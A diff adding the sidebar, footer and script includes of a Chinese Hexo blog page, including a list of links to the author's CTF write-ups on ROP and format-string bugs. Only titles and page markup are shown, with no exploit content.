+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="invincible"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">invincible</p>
+  <div class="description" itemprop="description">凌恒山其若陋兮、</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">8</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">3</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">4</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="/default/" rel="section"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/09/25/%E7%94%B5%E7%A7%91%E6%96%B0%E7%94%9F%E8%B5%9B/" title="电科新生赛">电科新生赛</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/10/21/%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E5%BE%88%E5%A4%9A%E7%9A%84fmt%E9%A2%98/" title="格式化字符串漏洞进阶">格式化字符串漏洞进阶</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/09/09/64%E4%BD%8D%E6%A0%87%E5%87%86ROP%E4%B8%8E%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/" title="标准64位程序ROP流程和堆栈平衡">标准64位程序ROP流程和堆栈平衡</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/09/07/Libcsearcher%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" title="LibcSearcher环境配置和ubuntu更新换源问题">LibcSearcher环境配置和ubuntu更新换源问题</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/08/20/string/" title="攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解">攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/09/03/babyrop/" title="标准32位程序ROP流程和c语言转义字符">标准32位程序ROP流程和c语言转义字符</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="分类于 学习笔记">学习笔记</a>
+</div>
+
+    <span><a href="/2021/10/24/%E5%A0%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-chunk%20overlapping/" title="堆学习-Chunk Overlapping">堆学习-Chunk Overlapping</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E/" title="分类于 版权声明">版权声明</a>
+</div>
+
+    <span><a href="/2021/08/20/%E5%A3%B0%E6%98%8E/" title="版权声明">版权声明</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2021</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">invincible @ Nirvana</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2021/10/24/堆学习笔记-chunk overlapping/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
